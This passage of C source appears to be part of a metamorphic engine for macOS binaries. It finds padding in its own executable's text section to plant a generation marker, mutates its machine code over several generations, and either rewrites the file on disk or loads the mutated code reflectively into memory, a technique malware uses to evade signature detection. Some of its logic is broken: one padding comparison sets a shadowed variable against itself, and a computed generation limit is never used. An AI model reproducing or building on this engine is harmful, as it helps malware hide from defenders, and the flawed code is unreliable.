    for (size_t i = 0; i <= size - sizeof(marker_t); i++) {
        size_t padding_len = 0;
        for (size_t j = 0; j < size - i && j < 256; j++) {
            uint8_t byte = code[i + j];
            if (byte == 0x90 || byte == 0x00 || byte == 0xCC) {
                padding_len++;
            } else {
                break;
            }
        }
        
        if (padding_len >= sizeof(marker_t)) {
            if (padding_len > padding_len) {
                padding_offset = i;
                padding_len = padding_len;
            }
        }
    }
    
    if (padding_offset != NOFFSET__) {
        memcpy(code + padding_offset, &new_marker, sizeof(marker_t));
        DBG("[*] Marker in %zu-byte at 0x%zx\n", padding_len, padding_offset);
        return padding_offset;
    }
    
    /* Look for any sequence of NOPs specifically */
    for (size_t i = 0; i <= size - sizeof(marker_t); i++) {
        bool all_nops = true;
        for (size_t j = 0; j < sizeof(marker_t); j++) {
            if (code[i + j] != 0x90) {
                all_nops = false;
                break;
            }
        }
        if (all_nops) {
            memcpy(code + i, &new_marker, sizeof(marker_t));
            DBG("[*] Marker in NOP at 0x%zx\n", i);
            return i;
        }
    }
    
    /* Look for alignment padding (int3 sequences) */
    for (size_t i = 0; i <= size - sizeof(marker_t); i++) {
        bool all_int3 = true;
        for (size_t j = 0; j < sizeof(marker_t); j++) {
            if (code[i + j] != 0xCC) {
                all_int3 = false;
                break;
            }
        }
        if (all_int3) {
            memcpy(code + i, &new_marker, sizeof(marker_t));
            DBG("[*] Marker in INT3 at 0x%zx\n", i);
            return i;
        }
    }
    
    /* Check end of section for full padding */
    if (size >= sizeof(marker_t) + 64) {
        /* Scan backwards from end looking for complete padding */
        for (size_t offset = size - sizeof(marker_t); offset > size - 2048 && offset > 0; offset--) {
            bool all_padding = true;
            for (size_t j = 0; j < sizeof(marker_t); j++) {
                uint8_t byte = code[offset + j];
                if (byte != 0x00 && byte != 0x90 && byte != 0xCC) {
                    all_padding = false;
                    break;
                }
            }
            
            if (all_padding) {
                memcpy(code + offset, &new_marker, sizeof(marker_t));
                DBG("[*] Marker near end at 0x%zx\n", offset);
                return offset;
            }
        }
    }
    
    /* Look for smaller padding and use NOPs to fill */
    for (size_t i = 0; i <= size - sizeof(marker_t); i++) {
        /* Look for at least 8 consecutive padding bytes */
        size_t padding_count = 0;
        for (size_t j = 0; j < sizeof(marker_t); j++) {
            uint8_t byte = code[i + j];
            if (byte == 0x00 || byte == 0x90 || byte == 0xCC) {
                padding_count++;
            }
        }
        
        if (padding_count >= 8) {
            /* Fill entire region with NOPs first, then embed marker */
            memset(code + i, 0x90, sizeof(marker_t));
            memcpy(code + i, &new_marker, sizeof(marker_t));
            DBG("[*] Marker with NOP fill at 0x%zx (%zu bytes)\n", i, padding_count);
            return i;
        }
    }
    /* Can't find a place for the marker, so mutate the hell out of this binary until something breaks. */
    return NOFFSET__;
}

/* Check if we reached max mutation depth */
static bool check_generation(uint8_t *code, size_t size, uint32_t *current_gen) {
    marker_t *marker = find_marker(code, size);
    
    if (!marker) {
        /* Virgin */
        *current_gen = 0;
        return true;
    }
    
    *current_gen = marker->generation;
    
    if (marker->generation >= MX_GEN) {
        return false;  /* Max generations reached */
    }
    
    return true;
}

int mutator(void) {
    /* Only mutate once per process lifetime */
    static bool mutation_done = false;
    if (mutation_done) {return 0;}
    
    char pathbuf[PATH_MAX];
    uint32_t psize = sizeof(pathbuf);
    if (_NSGetExecutablePath(pathbuf, &psize) != 0) return 1;
    
    struct mach_header_64 *mh = (struct mach_header_64 *)&_mh_execute_header;
    text_section_t tsec;
    
    if (!text_sec(mh, &tsec)) return 1;
    
    size_t text_size = (size_t)(tsec.file_end - tsec.file_start);
    
    intptr_t slide = img_slide(mh);
    uint8_t *runtime_text_base = (uint8_t *)(tsec.vm_start + slide);
    
    DBG("file=0x%llx-0x%llx, vm=0x%llx-0x%llx, slide=0x%lx, runtime=%p\n",
        tsec.file_start, tsec.file_end, tsec.vm_start, tsec.vm_end, slide, runtime_text_base);
    
    int fd = open(pathbuf, O_RDONLY);
    if (fd < 0) return 1;
    
    uint8_t *original_text = malloc(text_size);
    if (!original_text) {close(fd); return 1;}
    
    if (lseek(fd, (off_t)tsec.file_start, SEEK_SET) == (off_t)-1 ||
        read(fd, original_text, text_size) != (ssize_t)text_size) {
        free(original_text);
        close(fd);
        return 1;
    }
    close(fd);
    
    /* Check generation marker in code */
    uint32_t current_gen = 0;
    if (!check_generation(original_text, text_size, &current_gen)) {
        DBG("[*] Generations (%u) reached, No mutation\n", MX_GEN);
        free(original_text);
        return 0;
    }
    
    DBG("[*] Generation: %u/%u\n", current_gen, MX_GEN);
    
    /* Embed initial marker in virgin binary*/
    if (current_gen == 0) {
        g_marker_offset = embed_marker(original_text, text_size, 0);
        if (g_marker_offset != NOFFSET__) {
            DBG("[*] Initial marker at offset 0x%zx\n", g_marker_offset);
        } else {
            DBG("[!] Can't embed marker\n");
        }
    } else {
        /* Marker location */
        marker_t *marker = find_marker(original_text, text_size);
        if (marker) {
            g_marker_offset = (uint8_t*)marker - original_text;
            DBG("[*] Found Marker at offset 0x%zx\n", g_marker_offset);
        }
    }
    
    context_t ctx;
    if (!tx_Init(&ctx, original_text, text_size, mh, tsec.vm_start)) {
        free(original_text);
        return 1;
    }
    
    uint8_t *backup = malloc(text_size);
    if (!backup) {
        clear_tx(&ctx);
        free(original_text);
        return 1;
    }
    
    unsigned max_generations = 2 + (chacha20_random(&ctx.rng) % 3);
    bool success = false;
    bool mutated = false;
    
    for (unsigned gen = 1; gen <= MX_GEN; gen++) {
        memcpy(backup, ctx.working_code, MIN(ctx.codesz, text_size));
        size_t backup_size = ctx.codesz;
        
        if (!mOrph(&ctx, gen, text_size)) {
            memcpy(ctx.working_code, backup, text_size);
            ctx.codesz = backup_size;
            break;
        }
        
        if (memcmp(ctx.working_code, backup, MIN(ctx.codesz, text_size)) != 0) {
            mutated = true;
        }
    }
    
    if (mutated) {
        DBG("Generations: %u\n", MX_GEN);
        
        mutation_done = true;
        
#ifdef FOO
        if (ctx.codesz <= text_size) {
            /* Update */
            size_t marker_offset = embed_marker(ctx.working_code, ctx.codesz, current_gen + 1);
            if (marker_offset != NOFFSET__) {
                DBG("[*] Updated marker: %u -> %u (offset 0x%zx)\n", 
                    current_gen, current_gen + 1, marker_offset);
            } else {
                DBG("[!] Failed to update\n");
            }
            
            success = dsk_mut(&ctx, pathbuf, tsec.file_start, text_size);
            
            if (success) {
                DBG("[+] Mutation Passed (gen %u -> %u)\n", current_gen, current_gen + 1);
            } else {
                DBG("[!] Mutation failed\n");
                panic();
            }
        } else {
            DBG("[!] Cannot write size increased (%zu > %zu)\n", 
                ctx.codesz, text_size);
            success = false;
        }
#else
        if (!is_chunk_ok(ctx.working_code, ctx.codesz)) {
            DBG("[!] Code failed validation\n");
            DBG("   Rolling back to original code\n");
            success = false;
        } else {
            DBG("[+] Code validated\n"); 
            DBG("Attempting reflective load...\n");
            
            success = mem_mut(&ctx, runtime_text_base, text_size);
            
            if (!success) {
                DBG("[!] Loading failed\n");
                panic();
            }
        }
#endif
    } else {
        // This is a bad
        DBG("[!] No mutations after %u generations\n", MX_GEN);
        panic();
    }

    free(backup);
    clear_tx(&ctx);
    free(original_text);
    
    return success ? 0 : 1;
}
